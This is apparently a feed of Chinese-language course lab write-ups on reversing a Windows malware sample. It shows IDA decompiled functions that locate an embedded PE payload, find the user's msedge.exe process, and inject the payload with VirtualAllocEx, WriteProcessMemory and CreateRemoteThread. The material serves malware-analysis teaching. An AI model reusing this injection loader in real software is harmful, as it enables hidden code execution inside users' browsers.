&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>pe_file &lt;span style="color:#f92672">=&lt;/span> byte_140005040;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>pe_file_size &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">72770&lt;/span>i64; &lt;span style="color:#75715e">// 這是個是怎麼判斷成PE size我也不知道
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">**&lt;/span>pe_file &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>ZM&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(sub_1400013D0(&lt;span style="color:#f92672">*&lt;/span>pe_file) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x20B&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;remote dll optional header magic check failed&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;remote dll magic check failed&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>進到&lt;code>sub_140001BF0&lt;/code>之後可以先觀察&lt;code>sub_140001870&lt;/code>，前面有source code可以看到他正在比對&lt;code>byte_140005040&lt;/code>的前面兩個字元是不是等於&lt;code>MZ&lt;/code>，也就是一支PE file的magic header，並且又比對了後面0x18的位置是不是等於0x20B，也就是另外一個magic header(用來判斷該程式是否可於64-bits運行)，由以上操作幾乎可以確定駭客把真正的程式(可能是惡意的)塞在正常的PE file中
:::info
如果只是要解題的話，到這邊就可以了，只要利用前一題學到的把&lt;code>byte_140005040&lt;/code>改變他的type，變成&lt;code>char[72770]&lt;/code>，再用Shift+E，把raw data export出來，丟到&lt;a href="https://emn178.github.io/online-tools/md5_checksum.html">online md5 checksum&lt;/a>，就可以得到這支檔案的hash(&lt;code>462fe0007f86957f59824e113f78947c&lt;/code>)
&lt;img src="https://hackmd.io/_uploads/SJoeiepGT.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/rk7SigpGp.png" alt="" />
:::&lt;/li>
&lt;li>&lt;code>sub_1400013D0&lt;/code>仔細看他的操作，其實就是把&lt;code>byte_140005040&lt;/code>的地址，加上&lt;code>0x3C&lt;/code>，再取值，就是&lt;code>e_lfanew&lt;/code>，也就是NT Headers的file offset，這個offset加上原本的原本的&lt;code>140005040&lt;/code>就是NT header，所以可以把&lt;code>sub_1400013D0&lt;/code> rename成&lt;code>getNtHdr&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">getNtHdr&lt;/span>(&lt;span style="color:#66d9ef">__int64&lt;/span> a1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x3C&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>接下來可以改變這個function的type，按Y，&lt;code>改IMAGE_NT_HEADERS *__fastcall getNtHdr(_QWORD)&lt;/code>，就變得非常簡潔好看，另外，要把&lt;code>pe_file&lt;/code>的type從&lt;code>_int64&lt;/code>改成&lt;code>_QWORD&lt;/code>的原因是&lt;code>pe_file&lt;/code>存的是&lt;code>byte_140005040&lt;/code>的地址，不是數字，雖然代表的byte數一樣，但意義不相同，所以IDA可能會解析不出來
&lt;img src="https://hackmd.io/_uploads/ryHl0gaG6.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/rJniAlaM6.png" alt="" />&lt;/li>
&lt;li>最後就把目前的這個sub function rename成&lt;code>getEmbeddedPE_File&lt;/code>就可以了&lt;/li>
&lt;/ol>
&lt;p>:::info
&lt;img src="https://hackmd.io/_uploads/HJaNxWpzp.png" alt="" />
:::
:::spoiler 解析後&lt;/p></description></item><item><title>Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/</guid><description>&lt;h1 id="simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2">
 Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2)
 &lt;a class="anchor" href="#simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-process32firstw">Process32FirstW&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess">GetCurrentProcess&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/securitybaseapi/nf-securitybaseapi-equalsid">EqualSid&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-process32nextw">Process32NextW&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken">OpenProcessToken&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation">GetTokenInformation&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_1400016B0
:::spoiler IDA Source Code解析前
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#a6e22e">returnTargetPid&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD LastError; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD v2; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> WCHAR &lt;span style="color:#f92672">*&lt;/span>szExeFile; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">signed&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v4; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> WCHAR v5; &lt;span style="color:#75715e">// dx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v6; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD th32ProcessID; &lt;span style="color:#75715e">// [rsp+20h] [rbp-288h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hSnapshot; &lt;span style="color:#75715e">// [rsp+28h] [rbp-280h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hObject; &lt;span style="color:#75715e">// [rsp+30h] [rbp-278h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE CurrentProcess; &lt;span style="color:#75715e">// [rsp+38h] [rbp-270h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> PSID pSid1; &lt;span style="color:#75715e">// [rsp+40h] [rbp-268h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> PSID pSid2; &lt;span style="color:#75715e">// [rsp+48h] [rbp-260h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> PROCESSENTRY32W pe; &lt;span style="color:#75715e">// [rsp+50h] [rbp-258h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hSnapshot &lt;span style="color:#f92672">=&lt;/span> CreateToolhelp32Snapshot(&lt;span style="color:#ae81ff">2u&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( hSnapshot &lt;span style="color:#f92672">==&lt;/span> (HANDLE)&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>i64 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LastError &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;CreateToolhelp32Snapshot failed with error %lu&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, LastError);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pe.dwSize &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">568&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Process32FirstW(hSnapshot, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pe) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pSid2 &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x44u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CurrentProcess &lt;span style="color:#f92672">=&lt;/span> GetCurrentProcess();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001500(CurrentProcess, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pSid2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> th32ProcessID &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pSid1 &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x44u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hObject &lt;span style="color:#f92672">=&lt;/span> OpenProcess(&lt;span style="color:#ae81ff">0x400u&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, pe.th32ProcessID);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( hObject )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)sub_140001500(hObject, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pSid1) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( EqualSid(pSid1, pSid2) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> szExeFile &lt;span style="color:#f92672">=&lt;/span> pe.szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#e6db74">L&lt;/span>&lt;span style="color:#e6db74">&amp;#34;msedge.exe&amp;#34;&lt;/span> &lt;span style="color:#f92672">-&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)pe.szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( &lt;span style="color:#ae81ff">1&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>szExeFile &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(WCHAR &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)szExeFile &lt;span style="color:#f92672">+&lt;/span> v4) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>szExeFile;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>v5 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_14;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> v5 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(WCHAR &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)szExeFile &lt;span style="color:#f92672">+&lt;/span> v4) &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_14:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>v6 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> th32ProcessID &lt;span style="color:#f92672">=&lt;/span> pe.th32ProcessID;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> free(pSid1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CloseHandle(hObject);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>th32ProcessID &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> Process32NextW(hSnapshot, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pe) );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> free(pSid2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CloseHandle(hSnapshot);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> th32ProcessID;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;Process32First failed with error %lu&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, v2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CloseHandle(hSnapshot);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>首先，他先利用&lt;code>CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)&lt;/code>把當前系統中所有的process都snapshot，並回傳指定快照集的開啟控制碼(handle)&lt;/p></description></item><item><title>Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/</guid><description>&lt;h1 id="simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3">
 Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)
 &lt;a class="anchor" href="#simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/Memory/memory-protection-constants">記憶體保護常數&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread&lt;/a>&lt;/li>
&lt;li>Export Address Table(EAT)
&lt;blockquote>
&lt;p>&lt;img src="https://hackmd.io/_uploads/rJuBbwaGT.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/HJEI-P6zp.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/S1Qu-PTM6.png" alt="" />&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code &lt;code>sub_140001A60&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">sub_140001A60&lt;/span>(DWORD edge_pid, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pe_file, SIZE_T pe_file_size)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD v4; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD LastError; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hProcess; &lt;span style="color:#75715e">// [rsp+40h] [rbp-38h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>lpBaseAddress; &lt;span style="color:#75715e">// [rsp+48h] [rbp-30h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> LPTHREAD_START_ROUTINE lpStartAddress; &lt;span style="color:#75715e">// [rsp+50h] [rbp-28h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v9; &lt;span style="color:#75715e">// [rsp+58h] [rbp-20h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD ThreadId; &lt;span style="color:#75715e">// [rsp+60h] [rbp-18h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_1400018F0(pe_file, &lt;span style="color:#f92672">&amp;amp;&lt;/span>v9);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v9 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hProcess &lt;span style="color:#f92672">=&lt;/span> OpenProcess(&lt;span style="color:#ae81ff">0x43Au&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, edge_pid);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( hProcess )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpBaseAddress &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)VirtualAllocEx(hProcess, &lt;span style="color:#ae81ff">0&lt;/span>i64, pe_file_size, &lt;span style="color:#ae81ff">0x3000u&lt;/span>, &lt;span style="color:#ae81ff">0x40u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( WriteProcessMemory(hProcess, lpBaseAddress, pe_file, pe_file_size, &lt;span style="color:#ae81ff">0&lt;/span>i64) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpStartAddress &lt;span style="color:#f92672">=&lt;/span> (LPTHREAD_START_ROUTINE)&lt;span style="color:#f92672">&amp;amp;&lt;/span>lpBaseAddress[v9];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CreateRemoteThread(hProcess, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, (LPTHREAD_START_ROUTINE)&lt;span style="color:#f92672">&amp;amp;&lt;/span>lpBaseAddress[v9], &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>ThreadId);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;remote thread id: %lu, loader address: %p&amp;#34;&lt;/span>, ThreadId, lpStartAddress);
